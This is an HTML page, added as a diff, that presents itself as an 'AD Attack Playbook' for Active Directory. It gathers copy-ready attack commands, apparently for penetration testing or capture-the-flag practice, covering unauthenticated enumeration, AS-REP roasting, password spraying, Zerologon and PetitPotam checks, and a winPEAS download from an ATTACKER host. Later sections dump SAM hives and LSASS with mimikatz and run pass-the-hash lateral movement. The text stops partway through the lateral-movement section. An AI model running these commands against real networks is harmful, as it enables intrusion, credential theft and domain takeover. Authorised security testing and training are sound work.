@@ -1,0 +1,654 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>AD Attack Playbook</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<style>
+/* Layout: sticky grouped sidebar + scrollable main. Dark-first GitHub-ish palette, full theme support. */
+:root{
+  --bg:#f6f8fa;--surface:#ffffff;--surface2:#eef2f7;--border:#d0d7de;
+  --fg:#1f2328;--fg2:#5a6472;--accent:#0969da;--green:#1a7f37;--warn:#bc4c00;--danger:#cf222e;--violet:#8250df;
+  --tag-bg:#e8f0fe;--mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;--sans:'Inter',system-ui,sans-serif;
+  color-scheme:light;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0d1117;--surface:#161b22;--surface2:#1c2230;--border:#30363d;
+  --fg:#e6edf3;--fg2:#8b949e;--accent:#58a6ff;--green:#3fb950;--warn:#f0883e;--danger:#f85149;--violet:#bc8cff;
+  --tag-bg:#1f2937;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#0d1117;--surface:#161b22;--surface2:#1c2230;--border:#30363d;
+  --fg:#e6edf3;--fg2:#8b949e;--accent:#58a6ff;--green:#3fb950;--warn:#f0883e;--danger:#f85149;--violet:#bc8cff;
+  --tag-bg:#1f2937;color-scheme:dark;
+}
+*,*::before,*::after{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);font-size:14px;line-height:1.6;display:flex;min-height:100%}
+
+#sidebar{width:240px;min-width:240px;background:var(--surface);border-right:1px solid var(--border);position:sticky;top:env(safe-area-inset-top,0px);height:100vh;overflow-y:auto;flex-shrink:0}
+#sidebar-header{padding:16px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--surface);z-index:10}
+#sidebar-header h1{font-size:14px;font-weight:700;color:var(--accent);margin:0 0 2px;letter-spacing:.03em;font-family:var(--mono)}
+#sidebar-header p{font-size:11px;color:var(--fg2);margin:0}
+#sidebar nav{padding:6px 0}
+.navgroup{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--fg2);padding:12px 16px 4px;font-weight:700}
+.navgroup.p1{color:var(--accent)}.navgroup.p2{color:var(--warn)}
+#sidebar nav a{display:flex;align-items:center;gap:8px;padding:6px 16px;color:var(--fg2);text-decoration:none;font-size:12.5px;font-weight:500;border-left:2px solid transparent}
+#sidebar nav a:hover,#sidebar nav a.active{background:var(--surface2);color:var(--fg);border-left-color:var(--accent)}
+#sidebar nav a .port-tag{font-family:var(--mono);font-size:10px;background:var(--tag-bg);color:var(--accent);padding:1px 5px;border-radius:3px;margin-left:auto}
+
+#main{flex:1;padding:24px 32px;max-width:900px;min-width:0}
+.hero{border:1px solid var(--border);border-radius:10px;background:var(--surface);padding:18px 22px;margin-bottom:26px}
+.hero h2{margin:0 0 4px;font-size:18px}
+.hero p{margin:0;color:var(--fg2);font-size:13px}
+.hero .legend{display:flex;gap:14px;flex-wrap:wrap;margin-top:12px;font-size:11.5px;font-family:var(--mono)}
+.hero .legend span{display:inline-flex;align-items:center;gap:6px}
+.dot{width:9px;height:9px;border-radius:2px;display:inline-block}
+.dot.v{background:var(--green)}.dot.s{background:var(--danger)}.dot.m{background:var(--warn)}
+
+.partbar{display:flex;align-items:center;gap:12px;margin:34px 0 8px;padding:10px 16px;border-radius:8px;background:linear-gradient(90deg,var(--surface),transparent);border:1px solid var(--border);border-left:4px solid var(--accent)}
+.partbar.p2{border-left-color:var(--warn)}
+.partbar .pn{font-family:var(--mono);font-weight:700;font-size:12px;color:#fff;background:var(--accent);padding:3px 9px;border-radius:5px}
+.partbar.p2 .pn{background:var(--warn)}
+.partbar h2{margin:0;font-size:17px}
+.partbar p{margin:0;color:var(--fg2);font-size:12px;flex-basis:100%}
+
+.section{margin-bottom:30px;scroll-margin-top:14px}
+.section-header{display:flex;align-items:center;gap:10px;margin:18px 0 10px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.section-header h2{font-size:15px;font-weight:600;margin:0;font-family:var(--mono)}
+.port-badge{font-family:var(--mono);font-size:11px;font-weight:700;padding:2px 8px;border-radius:4px;background:var(--accent);color:#fff}
+.port-badge.green{background:var(--green)}.port-badge.orange{background:var(--warn)}.port-badge.red{background:var(--danger)}.port-badge.violet{background:var(--violet)}
+p.lead{color:var(--fg2);margin:0 0 10px}
+h3.sub{font-size:13.5px;margin:20px 0 6px;font-weight:600;color:var(--fg)}
+
+.code-block{background:var(--surface);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin:10px 0}
+.code-label{background:var(--surface2);border-bottom:1px solid var(--border);padding:5px 12px;font-size:11px;color:var(--fg2);font-family:var(--mono);display:flex;align-items:center;justify-content:space-between;gap:8px}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--fg2);font-size:10px;padding:2px 8px;border-radius:3px;cursor:pointer;font-family:var(--sans)}
+.copy-btn:hover{background:var(--border);color:var(--fg)}
+.copy-btn:focus-visible{outline:2px solid var(--accent)}
+pre{margin:0;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.65;color:var(--fg)}
+.c{color:var(--fg2)}         /* comment */
+.v{color:var(--accent)}      /* var */
+.f{color:var(--warn)}        /* flag */
+.t{color:var(--green)}       /* tool */
+.s{color:#d29922}            /* string/path */
+
+.port-table-wrap{overflow-x:auto;margin:10px 0}
+table{width:100%;border-collapse:collapse;font-size:12.5px;min-width:520px}
+th{text-align:left;padding:8px 11px;background:var(--surface2);border-bottom:2px solid var(--border);font-weight:600;color:var(--fg2);font-size:10.5px;text-transform:uppercase;letter-spacing:.05em}
+td{padding:8px 11px;border-bottom:1px solid var(--border);vertical-align:top}
+tr:hover td{background:var(--surface2)}
+.m{font-family:var(--mono)}
+.td-port{font-family:var(--mono);color:var(--accent);font-weight:600;white-space:nowrap}
+
+/* misconfig vuln/safe card */
+.mis{border:1px solid var(--border);border-radius:6px;overflow:hidden;margin:8px 0}
+.mis>div{padding:7px 12px;font-size:12px;display:flex;gap:8px;align-items:flex-start}
+.mis .vuln{background:color-mix(in srgb,var(--green) 12%,transparent);border-bottom:1px solid var(--border)}
+.mis .safe{background:color-mix(in srgb,var(--danger) 10%,transparent)}
+.mis b{font-family:var(--mono);font-size:10px;letter-spacing:.04em;padding:1px 6px;border-radius:3px;white-space:nowrap;flex-shrink:0;margin-top:1px}
+.mis .vuln b{background:var(--green);color:#fff}
+.mis .safe b{background:var(--danger);color:#fff}
+
+.note{border-left:3px solid var(--accent);background:var(--surface);border-radius:0 6px 6px 0;padding:10px 14px;margin:10px 0;font-size:12.5px;color:var(--fg2)}
+.note.warn{border-left-color:var(--warn)}
+.note b{color:var(--fg)}
+code{font-family:var(--mono);font-size:11.5px;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--green)}
+.steps{display:flex;flex-direction:column;gap:8px;margin:10px 0}
+.step{display:flex;gap:11px;background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:10px 13px}
+.step-num{width:22px;height:22px;border-radius:50%;background:var(--accent);color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.step-title{font-weight:600;font-size:12.5px;margin-bottom:2px}
+.step-desc{color:var(--fg2);font-size:12px}
+
+#theme-toggle{position:fixed;top:calc(env(safe-area-inset-top,0px) + 12px);right:16px;z-index:100;background:var(--surface);border:1px solid var(--border);color:var(--fg2);border-radius:6px;padding:5px 10px;cursor:pointer;font-size:12px;font-family:var(--sans)}
+#theme-toggle:hover{background:var(--surface2);color:var(--fg)}
+#theme-toggle:focus-visible{outline:2px solid var(--accent)}
+
+@media (max-width:760px){
+  body{flex-direction:column}
+  #sidebar{width:100%;height:auto;position:static;border-right:none;border-bottom:1px solid var(--border)}
+  #sidebar nav{display:flex;flex-wrap:wrap;padding:4px 8px}
+  .navgroup{flex-basis:100%;padding:8px 8px 2px}
+  #sidebar nav a{padding:5px 9px;border-left:none;border-bottom:2px solid transparent}
+  #sidebar nav a.active,#sidebar nav a:hover{border-bottom-color:var(--accent);border-left-color:transparent}
+  #main{padding:16px}
+}
+</style>
+
+<button id="theme-toggle" onclick="toggleTheme()" title="Toggle theme">☀ / ☾</button>
+
+<div id="sidebar">
+  <div id="sidebar-header"><h1>AD PLAYBOOK</h1><p>Enum → shell → DA</p></div>
+  <nav id="nav">
+    <div class="navgroup p1">Part 1 · No creds</div>
+    <a href="#setup" class="active">Setup <span class="port-tag">init</span></a>
+    <a href="#sweep">Port Sweep</a>
+    <a href="#dns">DNS <span class="port-tag">53</span></a>
+    <a href="#kerberos">Kerberos <span class="port-tag">88</span></a>
+    <a href="#rpc">MSRPC <span class="port-tag">135</span></a>
+    <a href="#netbios">NetBIOS <span class="port-tag">139</span></a>
+    <a href="#smb">SMB <span class="port-tag">445</span></a>
+    <a href="#ldap">LDAP <span class="port-tag">389</span></a>
+    <a href="#winrm">WinRM/RDP <span class="port-tag">5985</span></a>
+    <a href="#nfs">NFS <span class="port-tag">2049</span></a>
+    <a href="#cve">CVE Checks</a>
+    <a href="#firstcred">Get 1st Cred</a>
+    <div class="navgroup p2">Part 2 · Post-shell</div>
+    <a href="#triage">Shell Triage</a>
+    <a href="#localenum">Local Enum</a>
+    <a href="#adenum">AD Enum (auth)</a>
+    <a href="#creds">Cred Harvest</a>
+    <a href="#lateral">Lateral Movement</a>
+    <a href="#privesc">Windows PrivEsc</a>
+    <a href="#decode">Decode &amp; Hash ID</a>
+    <a href="#gotchas">Gotchas</a>
+  </nav>
+</div>
+
+<main id="main">
+
+  <div class="hero">
+    <h2>Active Directory &amp; Windows — Master Attack Playbook</h2>
+    <p>Two phases: enumerate from the outside with no credentials, then — once you land a shell or a valid cred — pivot through lateral movement and local privilege escalation to Domain Admin. Every misconfiguration is tagged with when it's exploitable and when it isn't.</p>
+    <div class="legend">
+      <span><i class="dot v"></i> VULN IF — conditions that make it exploitable</span>
+      <span><i class="dot s"></i> SAFE IF — conditions where it's a dead-end</span>
+      <span><i class="dot m"></i> gotcha / caveat</span>
+    </div>
+  </div>
+
+  <!-- ============ PART 1 ============ -->
+  <div class="partbar p1">
+    <span class="pn">PART 1</span>
+    <h2>Unauthenticated enumeration — IP + domain only</h2>
+    <p>No username, no password. Everything runs null / guest / anonymous or no bind at all. Goal: turn "IP + domain" into one valid credential.</p>
+  </div>
+
+  <div class="section" id="setup">
+    <div class="section-header"><span class="port-badge">INIT</span><h2>Environment setup</h2></div>
+    <div class="code-block"><div class="code-label">bash <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># reuse these everywhere</span>
+<span class="v">IP</span>=10.10.10.10
+<span class="v">DOMAIN</span>=domain.local
+<span class="v">DC</span>=dc01.$DOMAIN
+
+<span class="c"># resolve FQDN + sync clock (Kerberos dies on skew)</span>
+echo "$IP  $DC $DOMAIN" | sudo tee -a /etc/hosts
+sudo ntpdate $IP          <span class="c"># or: sudo rdate -n $IP / faketime</span></pre></div>
+  </div>
+
+  <div class="section" id="sweep">
+    <div class="section-header"><span class="port-badge orange">0</span><h2>Port sweep</h2></div>
+    <div class="code-block"><div class="code-label">nmap <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>nmap -Pn -p- --min-rate 5000 $IP -oA ad_full
+nmap -Pn -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,3389,2049,111 $IP -oA ad_svc
+nmap -Pn -sU -p 53,88,123,137,389 $IP   <span class="c"># key UDP</span></pre></div>
+    <div class="port-table-wrap"><table>
+      <thead><tr><th>Port</th><th>Service</th><th>No-cred value</th></tr></thead>
+      <tbody>
+        <tr><td class="td-port">53</td><td>DNS</td><td>Zone transfer, SRV records &rarr; find DCs</td></tr>
+        <tr><td class="td-port">88</td><td>Kerberos</td><td>Username enum + AS-REP roast (no password)</td></tr>
+        <tr><td class="td-port">135/593</td><td>MSRPC</td><td>Interface dump, Exchange detection</td></tr>
+        <tr><td class="td-port">137-139</td><td>NetBIOS</td><td>Hostname, domain</td></tr>
+        <tr><td class="td-port">389/636</td><td>LDAP(S)</td><td>Anonymous bind, RootDSE, naming contexts</td></tr>
+        <tr><td class="td-port">445</td><td>SMB</td><td>Null/guest session, RID brute, shares</td></tr>
+        <tr><td class="td-port">3268/3269</td><td>Global Catalog</td><td>Forest-wide LDAP</td></tr>
+        <tr><td class="td-port">464</td><td>kpasswd</td><td>Password change</td></tr>
+        <tr><td class="td-port">2049/111</td><td>NFS/rpcbind</td><td>Exported shares, often no auth</td></tr>
+        <tr><td class="td-port">5985/5986</td><td>WinRM</td><td>Remote mgmt (needs creds)</td></tr>
+        <tr><td class="td-port">9389</td><td>ADWS</td><td>AD Web Services (SoaPy)</td></tr>
+        <tr><td class="td-port">3389</td><td>RDP</td><td>Hostname / cert even unauth</td></tr>
+      </tbody>
+    </table></div>
+  </div>
+
+  <div class="section" id="dns">
+    <div class="section-header"><span class="port-badge green">53</span><h2>DNS</h2></div>
+    <div class="code-block"><div class="code-label">dig / dnsenum <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>dig @$IP $DOMAIN ANY
+dig @$IP AXFR $DOMAIN                 <span class="c"># zone transfer</span>
+nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $IP
+dnsenum --dnsserver $IP $DOMAIN</pre></div>
+  </div>
+
+  <div class="section" id="kerberos">
+    <div class="section-header"><span class="port-badge">88</span><h2>Kerberos — biggest no-creds win</h2></div>
+    <div class="code-block"><div class="code-label">kerbrute / impacket <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># 1) valid usernames, NO password</span>
+<span class="t">kerbrute</span> userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+<span class="c"># 2) AS-REP roast users with "Do not require preauth"</span>
+<span class="t">impacket-GetNPUsers</span> $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -outputfile asrep.txt
+<span class="c"># 3) crack</span>
+<span class="t">hashcat</span> <span class="f">-m 18200</span> asrep.txt rockyou.txt</pre></div>
+    <div class="mis">
+      <div class="vuln"><b>VULN IF</b> a user has <code>DONT_REQ_PREAUTH</code> set &rarr; you get a crackable AS-REP with no creds.</div>
+      <div class="safe"><b>SAFE IF</b> every account requires pre-auth (default). You can still enumerate valid names (no roast).</div>
+    </div>
+  </div>
+
+  <div class="section" id="rpc">
+    <div class="section-header"><span class="port-badge orange">135</span><h2>MSRPC</h2></div>
+    <div class="code-block"><div class="code-label">impacket <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="t">impacket-rpcdump</span> $IP | tee rpcdump.txt
+<span class="t">impacket-rpcdump</span> $IP | grep -iE <span class="s">'mapi|exchange'</span>   <span class="c"># Exchange = extra surface</span>
+rpcmap.py <span class="s">'ncacn_ip_tcp:'</span>$IP</pre></div>
+  </div>
+
+  <div class="section" id="netbios">
+    <div class="section-header"><span class="port-badge green">139</span><h2>NetBIOS</h2></div>
+    <div class="code-block"><div class="code-label">nmblookup / nbtscan <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>nmblookup -A $IP
+nbtscan $IP</pre></div>
+  </div>
+
+  <div class="section" id="smb">
+    <div class="section-header"><span class="port-badge">445</span><h2>SMB — null &amp; guest are gold</h2></div>
+    <div class="code-block"><div class="code-label">netexec / enum4linux / impacket <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="t">nxc</span> smb $IP                                   <span class="c"># OS, domain, signing, SMBv1</span>
+<span class="t">nxc</span> smb $IP <span class="f">-u</span> <span class="s">''</span> <span class="f">-p</span> <span class="s">''</span>                       <span class="c"># null session</span>
+<span class="t">nxc</span> smb $IP <span class="f">-u</span> <span class="s">'guest'</span> <span class="f">-p</span> <span class="s">''</span>                  <span class="c"># guest</span>
+<span class="t">nxc</span> smb $IP <span class="f">-u</span> <span class="s">'guest'</span> <span class="f">-p</span> <span class="s">''</span> --rid-brute 10000  <span class="c"># enumerate ALL users</span>
+<span class="t">nxc</span> smb $IP <span class="f">-u</span> <span class="s">''</span> <span class="f">-p</span> <span class="s">''</span> --shares
+<span class="t">enum4linux-ng</span> -A $IP
+<span class="t">smbclient</span> -N -L //$IP/
+<span class="t">impacket-lookupsid</span> $DOMAIN/guest@$IP -no-pass   <span class="c"># RID cycle via SAMR</span></pre></div>
+    <div class="mis">
+      <div class="vuln"><b>VULN IF</b> null/guest bind is allowed &rarr; user list via RID brute, readable shares, domain policy.</div>
+      <div class="safe"><b>SAFE IF</b> <code>RestrictAnonymous=1</code> and guest disabled &rarr; all of the above returns access-denied.</div>
+    </div>
+  </div>
+
+  <div class="section" id="ldap">
+    <div class="section-header"><span class="port-badge">389</span><h2>LDAP — anonymous bind</h2></div>
+    <div class="code-block"><div class="code-label">ldapsearch / nxc / windapsearch <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>nmap -Pn -p389 --script ldap-rootdse $IP           <span class="c"># no bind needed</span>
+ldapsearch -x -H ldap://$IP -s base namingcontexts
+ldapsearch -x -H ldap://$IP -b <span class="s">"DC=domain,DC=local"</span> <span class="s">"(objectClass=user)"</span> sAMAccountName description
+<span class="t">nxc</span> ldap $IP <span class="f">-u</span> <span class="s">''</span> <span class="f">-p</span> <span class="s">''</span> --users
+<span class="t">nxc</span> ldap $IP <span class="f">-u</span> <span class="s">''</span> <span class="f">-p</span> <span class="s">''</span> -M get-desc-users   <span class="c"># passwords in description!</span>
+<span class="t">windapsearch</span> -d $DOMAIN --dc $IP -U --full</pre></div>
+    <div class="mis">
+      <div class="vuln"><b>VULN IF</b> anonymous bind allowed &rarr; dump users, descriptions (often hold passwords), naming contexts.</div>
+      <div class="safe"><b>SAFE IF</b> anonymous bind disabled (modern default) &rarr; only RootDSE metadata leaks.</div>
+    </div>
+  </div>
+
+  <div class="section" id="winrm">
+    <div class="section-header"><span class="port-badge green">5985</span><h2>WinRM / RDP / ADWS</h2></div>
+    <div class="code-block"><div class="code-label">nxc <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="t">nxc</span> winrm $IP     <span class="c"># 5985</span>
+<span class="t">nxc</span> rdp   $IP     <span class="c"># 3389 — hostname/domain/cert even unauth</span></pre></div>
+  </div>
+
+  <div class="section" id="nfs">
+    <div class="section-header"><span class="port-badge green">2049</span><h2>NFS — often unauthenticated</h2></div>
+    <div class="code-block"><div class="code-label">rpcbind / showmount / mount <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># START rpcbind on YOUR Kali first, or showmount/mount fail</span>
+<span class="t">sudo systemctl start rpcbind</span>
+sudo systemctl status rpcbind        <span class="c"># confirm active</span>
+
+<span class="c"># list exported shares (no creds)</span>
+showmount -e $IP
+nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs $IP   <span class="c"># peek without mounting</span>
+
+<span class="c"># mount a share</span>
+mkdir -p /tmp/nfs
+sudo mount -t nfs $IP:/share_name /tmp/nfs -o nolock
+sudo mount -t nfs $IP:/ /tmp/nfs -o nolock          <span class="c"># if root exported</span>
+ls -la /tmp/nfs/
+
+<span class="c"># hunt files</span>
+find /tmp/nfs -name <span class="s">"*flag*"</span> -o -name <span class="s">"*.txt"</span> -o -name <span class="s">"*.xlsx"</span> -o -name <span class="s">"id_rsa"</span> 2>/dev/null
+sudo umount /tmp/nfs</pre></div>
+    <div class="mis">
+      <div class="vuln"><b>VULN IF</b> a share is exported to <code>*</code> / <code>no_root_squash</code> &rarr; read files, or drop a SUID binary as fake-root UID for local escalation on the NFS host.</div>
+      <div class="safe"><b>SAFE IF</b> exports are IP-restricted and <code>root_squash</code> is on &rarr; your UID maps to nobody, no SUID trick.</div>
+    </div>
+    <div class="note m"><b>UID mismatch?</b> If you get permission denied, create a local user with the owner's UID (<code>sudo useradd -u 1001 dummy; su dummy</code>) then read the mount.</div>
+  </div>
+
+  <div class="section" id="cve">
+    <div class="section-header"><span class="port-badge red">CVE</span><h2>No-cred exploit checks</h2></div>
+    <div class="code-block"><div class="code-label">nxc / coercion <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="t">nxc</span> smb $IP -M zerologon      <span class="c"># CVE-2020-1472 — instant DA if vuln</span>
+<span class="t">nxc</span> smb $IP -M petitpotam     <span class="c"># unauth coerce -> relay to ADCS (ESC8)</span>
+<span class="t">nxc</span> smb $IP -M nopac          <span class="c"># CVE-2021-42278/42287</span>
+python3 PetitPotam.py <span class="f">&lt;your-ip&gt;</span> $IP   <span class="c"># coerce DC auth, no creds</span></pre></div>
+  </div>
+
+  <div class="section" id="firstcred">
+    <div class="section-header"><span class="port-badge green">&rarr;</span><h2>Workflow: IP + domain &rarr; first credential</h2></div>
+    <div class="steps">
+      <div class="step"><div class="step-num">1</div><div><div class="step-title">Build username list</div><div class="step-desc"><code>kerbrute userenum</code> + SMB <code>--rid-brute</code> + anonymous LDAP, merge &amp; dedupe.</div></div></div>
+      <div class="step"><div class="step-num">2</div><div><div class="step-title">AS-REP roast</div><div class="step-desc"><code>GetNPUsers -no-pass</code> on the list &rarr; crack <code>-m 18200</code>.</div></div></div>
+      <div class="step"><div class="step-num">3</div><div><div class="step-title">Password spray (watch lockout)</div><div class="step-desc"><code>nxc smb $IP -u users.txt -p 'Season2025!' --continue-on-success</code></div></div></div>
+      <div class="step"><div class="step-num">4</div><div><div class="step-title">BloodHound on first cred</div><div class="step-desc"><code>bloodhound-python -u u -p p -d $DOMAIN -ns $IP -c all --zip</code></div></div></div>
+    </div>
+  </div>
+
+  <!-- ============ PART 2 ============ -->
+  <div class="partbar p2">
+    <span class="pn">PART 2</span>
+    <h2>Post-shell — lateral movement &amp; privilege escalation</h2>
+    <p>You have a shell or a valid credential. Now: situational awareness, harvest more creds, move sideways, and escalate locally to SYSTEM / domain to Domain Admin.</p>
+  </div>
+
+  <div class="section" id="triage">
+    <div class="section-header"><span class="port-badge orange">0</span><h2>Shell triage — first 60 seconds</h2></div>
+    <div class="code-block"><div class="code-label">cmd / powershell <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>whoami /all                      <span class="c"># user, groups, PRIVILEGES (key!)</span>
+whoami /priv                     <span class="c"># SeImpersonate/SeBackup/SeDebug = win</span>
+whoami /groups
+systeminfo                       <span class="c"># OS build -> kernel exploits</span>
+hostname &amp;&amp; ipconfig /all
+net user  &amp; net localgroup administrators
+net accounts                     <span class="c"># password/lockout policy</span>
+query user                       <span class="c"># other logged-on users (token theft)</span>
+netstat -ano                     <span class="c"># internal services to pivot</span></pre></div>
+    <div class="note warn"><b>Privilege map:</b> <code>SeImpersonate/SeAssignPrimaryToken</code> &rarr; Potato to SYSTEM · <code>SeBackup/SeRestore</code> &rarr; dump SAM/SYSTEM · <code>SeDebug</code> &rarr; dump LSASS · <code>SeTakeOwnership</code> &rarr; own a protected file · <code>SeLoadDriver</code> &rarr; driver exploit.</div>
+  </div>
+
+  <div class="section" id="localenum">
+    <div class="section-header"><span class="port-badge">auto</span><h2>Automated local enum</h2></div>
+    <div class="code-block"><div class="code-label">winPEAS / PowerUp / Seatbelt <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># download (adjust attacker IP/port)</span>
+powershell -c "iwr http://<span class="f">ATTACKER</span>:8000/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe"
+C:\Windows\Temp\wp.exe
+
+<span class="c"># PowerUp — finds service/registry/path misconfigs</span>
+powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
+<span class="c"># Seatbelt</span>
+.\Seatbelt.exe -group=all
+<span class="c"># metasploit suggester (if meterpreter)</span>
+run post/multi/recon/local_exploit_suggester</pre></div>
+  </div>
+
+  <div class="section" id="adenum">
+    <div class="section-header"><span class="port-badge violet">AD</span><h2>Authenticated AD enumeration</h2></div>
+    <p class="lead">With one valid cred, map the whole domain and find the path to DA.</p>
+    <div class="code-block"><div class="code-label">bloodhound / nxc / ldapdomaindump <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># collect graph</span>
+bloodhound-python -u <span class="v">USER</span> -p <span class="v">PASS</span> -d $DOMAIN -ns $IP -c all --zip
+<span class="c"># mass domain dump</span>
+<span class="t">nxc</span> ldap $IP -u USER -p PASS --users --groups --password-not-required --trusted-for-delegation
+ldapdomaindump -u $DOMAIN\\USER -p PASS $IP
+<span class="c"># Kerberoast + AS-REP (authenticated)</span>
+<span class="t">impacket-GetUserSPNs</span> $DOMAIN/USER:PASS -dc-ip $IP -request -outputfile kerb.txt   <span class="c"># -m 13100</span>
+<span class="t">impacket-GetNPUsers</span> $DOMAIN/USER:PASS -dc-ip $IP -request                         <span class="c"># -m 18200</span>
+<span class="c"># GPP / SYSVOL passwords</span>
+<span class="t">nxc</span> smb $IP -u USER -p PASS -M gpp_password
+<span class="c"># ADCS templates (ESC1-ESC16)</span>
+<span class="t">certipy</span> find -u USER@$DOMAIN -p PASS -dc-ip $IP -vulnerable -stdout
+<span class="c"># ACL edges from the host</span>
+<span class="t">bloodyAD</span> --host $IP -d $DOMAIN -u USER -p PASS get writable</pre></div>
+    <h3 class="sub">Common AD misconfigs &rarr; abuse</h3>
+    <div class="port-table-wrap"><table>
+      <thead><tr><th>Find</th><th>Abuse</th></tr></thead>
+      <tbody>
+        <tr><td class="m">SPN on a user</td><td>Kerberoast &rarr; crack TGS (-m 13100)</td></tr>
+        <tr><td class="m">DONT_REQ_PREAUTH</td><td>AS-REP roast (-m 18200)</td></tr>
+        <tr><td class="m">GenericAll / GenericWrite on user</td><td>Reset pw / Shadow Credentials / targeted Kerberoast</td></tr>
+        <tr><td class="m">WriteDACL / WriteOwner</td><td>Grant self rights &rarr; take over object</td></tr>
+        <tr><td class="m">AddSelf / GenericWrite on group</td><td>Add self to privileged group</td></tr>
+        <tr><td class="m">GetChanges + GetChangesAll</td><td>DCSync &rarr; dump all hashes</td></tr>
+        <tr><td class="m">Unconstrained delegation</td><td>Capture TGTs (printerbug coerce)</td></tr>
+        <tr><td class="m">Constrained delegation</td><td>S4U2Self/Proxy &rarr; impersonate</td></tr>
+        <tr><td class="m">RBCD (WriteAccountRestrictions)</td><td>Add fake computer &rarr; S4U impersonate</td></tr>
+        <tr><td class="m">Vulnerable cert template</td><td>ESC1/2/4/7... &rarr; certipy &rarr; DA</td></tr>
+      </tbody>
+    </table></div>
+  </div>
+
+  <div class="section" id="creds">
+    <div class="section-header"><span class="port-badge red">loot</span><h2>Credential harvesting</h2></div>
+    <div class="code-block"><div class="code-label">LSASS / SAM / mimikatz <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># SAM + SYSTEM (local hashes) — needs admin/SeBackup</span>
+reg save HKLM\SAM     C:\Windows\Temp\sam.hive
+reg save HKLM\SYSTEM  C:\Windows\Temp\system.hive
+reg save HKLM\SECURITY C:\Windows\Temp\security.hive
+<span class="c"># exfil to Kali SMB server, then:</span>
+<span class="t">impacket-secretsdump</span> -sam sam.hive -system system.hive -security security.hive LOCAL
+<span class="t">pypykatz</span> registry --sam sam.hive --system system.hive security.hive
+
+<span class="c"># LSASS (needs SeDebug / admin)</span>
+<span class="t">mimikatz</span> "privilege::debug" "sekurlsa::logonpasswords" exit
+<span class="t">mimikatz</span> "sekurlsa::ekeys" exit          <span class="c"># AES keys for PtT</span>
+
+<span class="c"># saved creds / DPAPI</span>
+cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  <span class="c"># autologon creds</span>
+reg query HKLM /f password /t REG_SZ /s</pre></div>
+    <div class="mis">
+      <div class="vuln"><b>VULN IF</b> you're local admin / have <code>SeBackupPrivilege</code> or <code>SeDebugPrivilege</code> &rarr; hive &amp; LSASS dumps succeed.</div>
+      <div class="safe"><b>SAFE IF</b> you're a standard user with LSASS PPL / Credential Guard on &rarr; dumps blocked, use other paths.</div>
+    </div>
+  </div>
+
+  <div class="section" id="lateral">
+    <div class="section-header"><span class="port-badge">move</span><h2>Lateral movement</h2></div>
+    <p class="lead">Credential material (password / NT hash / Kerberos ticket / AES key) + an execution method = movement.</p>
+    <div class="code-block"><div class="code-label">Pass-the-Hash / Ticket / exec <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># Pass-the-Hash</span>
+<span class="t">nxc</span> smb $IP -u Administrator -H <span class="v">&lt;NTHASH&gt;</span>                 <span class="c"># (Pwn3d!) check</span>
+<span class="t">impacket-psexec</span>  $DOMAIN/Administrator@$IP -hashes :<span class="v">&lt;NTHASH&gt;</span>   <span class="c"># SYSTEM, noisy</span>
+<span class="t">impacket-wmiexec</span>  $DOMAIN/Administrator@$IP -hashes :<span class="v">&lt;NTHASH&gt;</span>   <span class="c"># semi-interactive, quieter</span>
+<span class="t">impacket-smbexec</span>  $DOMAIN/Administrator@$IP -hashes :<span class="v">&lt;NTHASH&gt;</span>
+<span class="t">evil-winrm</span> -i $IP -u Administrator -H <span class="v">&lt;NTHASH&gt;</span>             <span class="c"># 5985, clean PS</span>
+
